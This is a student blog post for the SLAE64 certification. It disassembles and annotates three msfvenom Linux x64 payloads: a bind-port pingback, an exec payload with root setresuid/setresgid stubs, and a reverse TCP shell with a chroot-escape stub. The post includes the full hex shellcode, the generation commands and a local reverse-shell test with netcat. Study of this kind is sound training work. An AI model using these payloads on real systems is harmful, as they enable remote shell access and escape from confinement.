---
layout: single
title: SLAE Assignment 5 - MsfVenom Shellcodes Analysis
date: 2020-6-05
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING64.png
tags:
    - Shellcoding
    - Linux
    - x64
    - SLAE64
    - Metasploit
---

![](/assets/images/slae/SHELLCODING64.png)

## Introduction
For this fifth assignment, our goal is to dissect and present an analysis of at least three msfvenom shellcodes. 

All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE64/tree/master/Assignment-05-MsfVenom_shellcodes_analysis)

##  Selected payloads

So the payloads I've chosen are :

	- linux/x64/pingback_bind_tcp

	- linux/x64/exec
		with options :
		* AppendExit
		* PrependSetresgid
		* PrependSetresuid

	- linux/x64/shell_reverse_tcp
		with options :
		* PrependChrootBreak

## linux/x64/pingback_bind_tcp
Description : Accept a connection from attacker and report UUID (Linux x64)

To begin, we need to generate the payload and we will set it to bind on port 4444 :
```plaintext
skrox@kali:~$ msfvenom -p linux/x64/pingback_bind_tcp LPORT=4444 -f c
[-] WARNING: UUID cannot be saved because database is inactive.
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 109 bytes
Final size of c file: 484 bytes
unsigned char buf[] = 
"\x56\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
"\x85\xc0\x78\x52\x48\x97\x48\xc7\xc1\x02\x00\x11\x5c\x51\x48"
"\x89\xe6\x54\x5e\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x6a\x32\x58"
"\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x99\x52\x52\x54\x5e\x6a\x1c"
"\x48\x8d\x14\x24\x0f\x05\x48\x97\x6a\x10\x5a\xe8\x10\x00\x00"
"\x00\x96\x33\xfd\x16\x90\xd2\x4a\x84\xa1\x8b\x4c\x22\xd4\x95"
"\x68\xed\x5e\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x6a"
"\x01\x5f\x0f\x05";
```

We insert it into a wrapper, we compile it and run it with gdb :
```plaintext
skrox@kali:~$ g++ -ggdb -m64 -fno-stack-protector -z execstack -o pingback-bind shellcode.cpp
skrox@kali:~$ gdb ./pingback-bind
```

Now my analysis of the payload and the gdb commands I've used to see its assembly code :
```nasm
(gdb) break *&payload
Breakpoint 1 at 0x4060
(gdb) run
Starting program: /home/skrox/Desktop/github-repos/SLAE64/Assignment-05-MsfVenom_shellcodes_analysis/pingback-bind 

Breakpoint 1, 0x0000555555558060 in payload ()
(gdb) disas
Dump of assembler code for function payload:
=> 0x0000555555558060 <+0>:	push   rsi		; 
   0x0000555555558061 <+1>:	push   rax		; I don't know why these two instructions are executed
							; maybe for compatibility issue with some options.

; socket(AF_INET, SOCK_STREAM, 0)
   0x0000555555558062 <+2>:	push   0x29
   0x0000555555558064 <+4>:	pop    rax		; socket syscall value	
   0x0000555555558065 <+5>:	cdq    			; RDX set to 0
   0x0000555555558066 <+6>:	push   0x2		
   0x0000555555558068 <+8>:	pop    rdi	 	; AF_INET
   0x0000555555558069 <+9>:	push   0x1	
   0x000055555555806b <+11>:	pop    rsi		; SOCK_STREAM
   0x000055555555806c <+12>:	syscall 		; exec socket 

   0x000055555555806e <+14>:	test   rax,rax		; cmp RAX, 0
   0x0000555555558071 <+17>:	js     0x5555555580c5 <payload+101> ; if socket return error SF=1
							            ; jump to exit(1)

; bind(sockfd, {AF_INET, port 4444, INADDR_ANY}, 16)
   0x0000555555558073 <+19>:	xchg   rdi,rax		; move sockfd to RDI
   0x0000555555558075 <+21>:	mov    rcx,0x5c110002   ; 0x000000005c110002
   0x000055555555807c <+28>:	push   rcx              
   0x000055555555807d <+29>:	mov    rsi,rsp		; RSI point to AF_INET, port 4444, INADDR_ANY 
   0x0000555555558080 <+32>:	push   rsp		
   0x0000555555558081 <+33>:	pop    rsi		; same as previously...
   0x0000555555558082 <+34>:	push   0x31
   0x0000555555558084 <+36>:	pop    rax		; bind syscall value
   0x0000555555558085 <+37>:	push   0x10
   0x0000555555558087 <+39>:	pop    rdx		; RDX set to 16 addrlen
   0x0000555555558088 <+40>:	syscall 		; exec bind

; listen(sockfd, 1)
   0x000055555555808a <+42>:	push   0x32
   0x000055555555808c <+44>:	pop    rax		; listen syscall value
   0x000055555555808d <+45>:	push   0x1		
   0x000055555555808f <+47>:	pop    rsi		; backlog (queue) 1
							; RDI already set to sockfd
   0x0000555555558090 <+48>:	syscall 		; exec listen

; accept(socket, *addr, *addrlen)
   0x0000555555558092 <+50>:	push   0x2b
   0x0000555555558094 <+52>:	pop    rax		; accept syscall value
   0x0000555555558095 <+53>:	cdq    			; RDX set to 0
   0x0000555555558096 <+54>:	push   rdx		;
   0x0000555555558097 <+55>:	push   rdx		; set 16 bytes of memory to 00	
   0x0000555555558098 <+56>:	push   rsp
   0x0000555555558099 <+57>:	pop    rsi		; RSI point to 16 bytes of free memory (for *addr)
   0x000055555555809a <+58>:	push   0x1c
   0x000055555555809c <+60>:	lea    rdx,[rsp]	; RDX point to addrlen value 28
   0x00005555555580a0 <+64>:	syscall 		; exec accept

; write(sockfd, *buf, 16)
   0x00005555555580a2 <+66>:	xchg   rdi,rax		; set RDI to the new sockfd
   0x00005555555580a4 <+68>:	push   0x10		
   0x00005555555580a6 <+70>:	pop    rdx		; set RDX to 10 (16 bytes)
   0x00005555555580a7 <+71>:	call   0x5555555580bc <payload+92>	; jump 16 bytes 
									; they will be used to write datas

   0x00005555555580ac <+76>:	xchg   esi,eax				; 1 byte
   0x00005555555580ad <+77>:	xor    edi,ebp				; 2 bytes
   0x00005555555580af <+79>:	(bad)  					; 1 byte
   0x00005555555580b0 <+80>:	nop					; 1 byte
   0x00005555555580b1 <+81>:	ror    BYTE PTR [rdx-0x7c],cl		; 3 byte
   0x00005555555580b4 <+84>:	movabs eax,ds:0x5eed6895d4224c8b	; 8 byte + 5e(pop rsi) 
									; where the jump lands
									; Total 16bytes jumped

; Here to understand what happen we need to print instructions from the 
; memory address of the jmp instructions destination
(gdb) x/10i 0x5555555580bc
   0x5555555580bc <payload+92>:	pop    rsi				; RSI point to the start of 
									; the 16 jumped bytes
									; 0x844ad29016fd3396
									; 0xed6895d4224c8ba1
   0x5555555580bd <payload+93>:	xor    rax,rax				
   0x5555555580c0 <payload+96>:	inc    rax				; write syscall value
   0x5555555580c3 <payload+99>:	syscall 				; exec write

; Exit on error
   0x00005555555580c5 <+101>:	push   0x3c				;exit syscall value
   0x00005555555580c7 <+103>:	pop    rax				
   0x00005555555580c8 <+104>:	push   0x1				;return value
   0x00005555555580ca <+106>:	pop    rdi
   0x00005555555580cb <+107>:	syscall 				;call exit(1)

   0x00005555555580cd <+109>:	add    BYTE PTR [rax],al		; trash
End of assembler dump.

```
So this payload try to open a socket and exit if there is an error,  
else it bind to a port and on an incoming client connection send this byte sequence :  
3396 16fd d290 844a 8ba1 224c 95d4 ed68 (the Universally Unique Identifier (UUID) from the description) then exit.

This payload is only used to provide confirmation of remote execution on a target, to get a proof that a target is exploitable without accessing datas on the target and so without risking the fact that a third party may sniff important data between the target and the pentester during a pentest.

## linux/x64/exec

With options :
	CMD="echo Hello World !"
	AppendExit		Append a stub that executes the exit(0) system call
	PrependSetresgid	Prepend a stub that executes the setresgid(0, 0, 0) system call
	PrependSetresuid	Prepend a stub that executes the setresuid(0, 0, 0) system call


We need to generate it :
```plaintext
skrox@kali:~/$ msfvenom -p linux/x64/exec CMD="echo Hello World !" AppendExit=true PrependSetresuid=true PrependSetresgid=true -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 88 bytes
Final size of c file: 394 bytes
unsigned char buf[] = 
"\x48\x31\xff\x48\x89\xfe\x6a\x75\x58\x0f\x05\x48\x31\xff\x48"
"\x89\xfe\x6a\x77\x58\x0f\x05\x6a\x3b\x58\x99\x48\xbb\x2f\x62"
"\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00"
"\x48\x89\xe6\x52\xe8\x13\x00\x00\x00\x65\x63\x68\x6f\x20\x48"
"\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x20\x21\x00\x56\x57"
"\x48\x89\xe6\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05";
```
We insert it into a wrapper, we compile it and run it with gdb :
```plaintext
skrox@kali:~$ g++ -ggdb -m64 -fno-stack-protector -z execstack -o exec shellcode.cpp 
skrox@kali:~$ gdb ./exec
```
Then we look at the instructions with gdb :
```nasm
(gdb) break *&payload
Breakpoint 1 at 0x4060
(gdb) run
Starting program: /home/skrox/Desktop/github-repos/SLAE64/Assignment-05-MsfVenom_shellcodes_analysis/exec 

Breakpoint 1, 0x0000555555558060 in payload ()
(gdb) disas
Dump of assembler code for function payload:

; setresuid(0,0,trash)
; set real, effective and saved user or group ID
=> 0x0000555555558060 <+0>:	xor    rdi,rdi		; RDI set to 0
   0x0000555555558063 <+3>:	mov    rsi,rdi		; RSI set to 0
   0x0000555555558066 <+6>:	push   0x75		; #define __NR_setresuid 117
   0x0000555555558068 <+8>:	pop    rax
   0x0000555555558069 <+9>:	syscall 		; exec setresuid()
							; we can see that it use trash value for RDX
							; the argument for suid (saved set-user-ID)
							; because it is only used to drop EUID permission,
							; if we want to create a file that belong to the RUID
							; when using a SUID program
; setresgid(0,0,trash)
; set real, effective and saved user or group ID
   0x000055555555806b <+11>:	xor    rdi,rdi		; RDI set to 0
   0x000055555555806e <+14>:	mov    rsi,rdi		; RSI set to 0
   0x0000555555558071 <+17>:	push   0x77		; #define __NR_setresgid 119
   0x0000555555558073 <+19>:	pop    rax
   0x0000555555558074 <+20>:	syscall 		; exec setresgid()
							; same as setresuid for the RDX value

; execve("/bin/sh",["/bin/sh","-c","Hello World !"],NULL)
   0x0000555555558076 <+22>:	push   0x3b
   0x0000555555558078 <+24>:	pop    rax			   ; execve syscall value
   0x0000555555558079 <+25>:	cdq    			           ; RDX set to 0
   0x000055555555807a <+26>:	movabs rbx,0x68732f6e69622f	   ; \x00hs/nib/
   0x0000555555558084 <+36>:	push   rbx
   0x0000555555558085 <+37>:	mov    rdi,rsp			   ; RDI point to '/bin/sh\x00'
   0x0000555555558088 <+40>:	push   0x632d			   ; c-	
   0x000055555555808d <+45>:	mov    rsi,rsp	                   ; RSI point to '-c'
   0x0000555555558090 <+48>:	push   rdx			   ; push 0, null pointer to end argv[]
   0x0000555555558091 <+49>:	call   0x5555555580a9 <payload+73> ; jump and push the address of
								   ; the 'Hello World !\x00' string
								   ; that start at the RIP address

;;; Jumped parts (19 bytes)
; (gdb) x/s 0x0000555555558096
; 0x555555558096 <payload+54>:	"echo Hello World !" (+\x00 from 005657   add [bp+0x57],dl)

   0x0000555555558096 <+54>:	movsxd ebp,DWORD PTR gs:[rax+0x6f]
   0x000055555555809a <+58>:	and    BYTE PTR [rax+0x65],cl
   0x000055555555809d <+61>:	ins    BYTE PTR es:[rdi],dx
   0x000055555555809e <+62>:	ins    BYTE PTR es:[rdi],dx
   0x000055555555809f <+63>:	outs   dx,DWORD PTR ds:[rsi]
   0x00005555555580a0 <+64>:	and    BYTE PTR [rdi+0x6f],dl
   0x00005555555580a3 <+67>:	jb     0x555555558111
   0x00005555555580a5 <+69>:	and    BYTE PTR fs:[rcx],ah
   0x00005555555580a8 <+72>:	add    BYTE PTR [rsi+0x57],dl	    ; the call lands on the second byte of
								    ; $ ndisasm exec|grep 005657
								    ; 005657   add [bp+0x57],dl
								    ; 56(push rsi) 57(push rdi)
;;;;;;;
; we need to examine the instructions starting to 0x00005555555580a9
; to see what is really executed
(gdb) x/4i 0x00005555555580a9
   0x5555555580a9 <payload+73>:	push   rsi		; push pointer to '-c'
   0x5555555580aa <payload+74>:	push   rdi		; push pointer to '/bin/sh\x00'
   0x00005555555580ab <+75>:	mov    rsi,rsp		; RSI point to ["/bin/sh","-c","Hello World !"]
   0x00005555555580ae <+78>:	syscall 		; exec execve

; exit(0)
   0x00005555555580b0 <+80>:	xor    rdi,rdi			; RDI set to 0
   0x00005555555580b3 <+83>:	push   0x3c
   0x00005555555580b5 <+85>:	pop    rax			; exit syscall value
   0x00005555555580b6 <+86>:	syscall 			; exec clean exit

   0x00005555555580b8 <+88>:	add    BYTE PTR [rax],al        ; trash
End of assembler dump.
```
We are done with this one.

## linux/x64/shell_reverse_tcp

With options :
	PrependChrootBreak	   Prepend a stub that will break out of a chroot (includes setreuid to root)

We generate it :
```plaintext
skrox@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 PrependChrootBreak=true ReverseListenerThreaded=true -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 151 bytes
Final size of c file: 661 bytes
unsigned char buf[] = 
"\x48\x31\xff\x48\x89\xfe\x48\x89\xf8\xb0\x71\x0f\x05\x48\xbf"
"\x71\x77\x4d\x44\x42\x6f\x72\x57\x56\x57\x48\x89\xe7\x66\xbe"
"\xed\x01\x6a\x53\x58\x0f\x05\x48\x31\xd2\xb2\xa1\x48\x89\xd0"
"\x0f\x05\x66\xbe\x2e\x2e\x56\x48\x89\xe7\x6a\x45\x5b\x6a\x50"
"\x58\x0f\x05\xfe\xcb\x75\xf7\x6a\x2e\x48\x89\xe7\x48\x89\xd0"
"\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a"
"\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f"
"\x05";
```
Like always, we copy/paste it into a wrapper compile it and run it with gdb :
```plaintext
skrox@kali:~$ g++ -ggdb -m64 -fno-stack-protector -z execstack -o reverse-tcp shellcode.cpp
skrox@kali:~$ gdb ./reverse-tcp
```

Then we break at the start of the payload and look at its instructions :
```nasm
(gdb) break *&payload
Breakpoint 1 at 0x4060
(gdb) run
Starting program: /home/skrox/Desktop/github-repos/SLAE64/Assignment-05-MsfVenom_shellcodes_analysis/reverse-tcp 

Breakpoint 1, 0x0000555555558060 in payload ()
(gdb) disas
Dump of assembler code for function payload:

; setreuid(0,0)
; set real and/or effective user or group ID
=> 0x0000555555558060 <+0>:	xor    rdi,rdi		; RDI set to 0
   0x0000555555558063 <+3>:	mov    rsi,rdi		; RSI set to 0
   0x0000555555558066 <+6>:	mov    rax,rdi		; RAX  set to 0
   0x0000555555558069 <+9>:	mov    al,0x71		; RAX set to setreuid syscall value
   0x000055555555806b <+11>:	syscall 		; exec setreuid

; mkdir("qwMDBorW", '755')
   0x000055555555806d <+13>:	movabs rdi,0x57726f42444d7771  ; random string WroBDMwq
   0x0000555555558077 <+23>:	push   rsi	 	; string terminator
   0x0000555555558078 <+24>:	push   rdi		; 
   0x0000555555558079 <+25>:	mov    rdi,rsp		; RDI point to "qwMDBorW"
   0x000055555555807c <+28>:	mov    si,0x1ed		; permission mode 755
   0x0000555555558080 <+32>:	push   0x53
   0x0000555555558082 <+34>:	pop    rax		; mkdir syscall value
   0x0000555555558083 <+35>:	syscall 		; exec mkdir

; chroot("qwMDBorW")
; change root directory
   0x0000555555558085 <+37>:	xor    rdx,rdx
   0x0000555555558088 <+40>:	mov    dl,0xa1		; RDX set to 0xa1
   0x000055555555808a <+42>:	mov    rax,rdx		; chroot syscall value 
							; RDI already point to "qwMDBorW"
   0x000055555555808d <+45>:	syscall 		; exec chroot

; chdir("..") 69 times (is it an easter egg ? or I'm perverted ?)
; change working directory
   0x000055555555808f <+47>:	mov    si,0x2e2e	; ..
   0x0000555555558093 <+51>:	push   rsi		; 
   0x0000555555558094 <+52>:	mov    rdi,rsp		; RDI point to ".."
   0x0000555555558097 <+55>:	push   0x45		;
   0x0000555555558099 <+57>:	pop    rbx		; RBX set to 69 (will be used as counter)
   0x000055555555809a <+58>:	push   0x50
   0x000055555555809c <+60>:	pop    rax		; chdir syscall value
   0x000055555555809d <+61>:	syscall 		; exec chdir
   0x000055555555809f <+63>:	dec    bl
   0x00005555555580a1 <+65>:	jne    0x55555555809a <payload+58> ; if RBX not 0 re-call chdir("..")

: chroot(".")
; change process root directory to /
   0x00005555555580a3 <+67>:	push   0x2e
   0x00005555555580a5 <+69>:	mov    rdi,rsp		; RDI point to "."
   0x00005555555580a8 <+72>:	mov    rax,rdx		; RAX set chroot syscall value
   0x00005555555580ab <+75>:	syscall 		; exec chroot

; socket(AF_INET, SOCK_STREAM, 0)
   0x00005555555580ad <+77>:	push   0x29		
   0x00005555555580af <+79>:	pop    rax		; socket syscall value
   0x00005555555580b0 <+80>:	cdq    			; RDX set to 0
   0x00005555555580b1 <+81>:	push   0x2		
   0x00005555555580b3 <+83>:	pop    rdi		; AF_INET
   0x00005555555580b4 <+84>:	push   0x1
   0x00005555555580b6 <+86>:	pop    rsi		; SOCK_STREAM
   0x00005555555580b7 <+87>:	syscall 		; exec socket

; connect(sockfd, {AF_INET, 4444, 127.0.0.1}, 16)
   0x00005555555580b9 <+89>:	xchg   rdi,rax		; RDI set to sockfd
   0x00005555555580bb <+91>:	movabs rcx,0x100007f5c110002	; 127.0.0.1, 4444, AF_INET
   0x00005555555580c5 <+101>:	push   rcx	
   0x00005555555580c6 <+102>:	mov    rsi,rsp		; RSI point to {AF_INET, 4444, 127.0.0.1}
   0x00005555555580c9 <+105>:	push   0x10
   0x00005555555580cb <+107>:	pop    rdx		; addrlen (16)
   0x00005555555580cc <+108>:	push   0x2a
   0x00005555555580ce <+110>:	pop    rax		; connect syscall value
   0x00005555555580cf <+111>:	syscall 		; exec connect

; dup2(sockfd, stderr to stdin) loop
   0x00005555555580d1 <+113>:	push   0x3
   0x00005555555580d3 <+115>:	pop    rsi
   0x00005555555580d4 <+116>:	dec    rsi		; start counter from 2 to 0
   0x00005555555580d7 <+119>:	push   0x21	
   0x00005555555580d9 <+121>:	pop    rax		; dup2 syscall value
   0x00005555555580da <+122>:	syscall 		; exec dup2
   0x00005555555580dc <+124>:	jne    0x5555555580d4 <payload+116>  ; loop until RSI = 0

; execve("/bin/sh",["/bin/sh"],NULL)
   0x00005555555580de <+126>:	push   0x3b
   0x00005555555580e0 <+128>:	pop    rax			; execve syscall value
   0x00005555555580e1 <+129>:	cdq    				; RDX set to 0
   0x00005555555580e2 <+130>:	movabs rbx,0x68732f6e69622f	; \x00hs/nib/
   0x00005555555580ec <+140>:	push   rbx			; 
   0x00005555555580ed <+141>:	mov    rdi,rsp			; RDI point to /bin/sh\x00
   0x00005555555580f0 <+144>:	push   rdx			; array terminator
   0x00005555555580f1 <+145>:	push   rdi			; push address of /bin/sh\x00
   0x00005555555580f2 <+146>:	mov    rsi,rsp			; RSI point to ["/bin/sh"]
   0x00005555555580f5 <+149>:	syscall 			; exec execve

   0x00005555555580f7 <+151>:	add    BYTE PTR [rax],al   ;Trash
End of assembler dump.
```
For information about the jail break techniques used in this payload you can check this link :  
[Escaping a chroot jail](https://filippo.io/escaping-a-chroot-jail-slash-1/)
Then it is a classical reverse shell tcp.

Finally we can test it to see the directory creation with permission, and the current directory :
```plaintext
skrox@kali:~$ ./reverse-tcp 
skrox@kali:~$ ls -l
total 128
	....
drwxr-xr-x 2 skrox skrox  4096 juin   5 15:55 qwMDBorW
	....
```
On the terminal with a netcat listener :
```plaintext
skrox@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45880
pwd
/
exit
```

And this the end of this assignement, thanks for reading :)

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-
linux/index.html)  
Student ID: PA-14186***
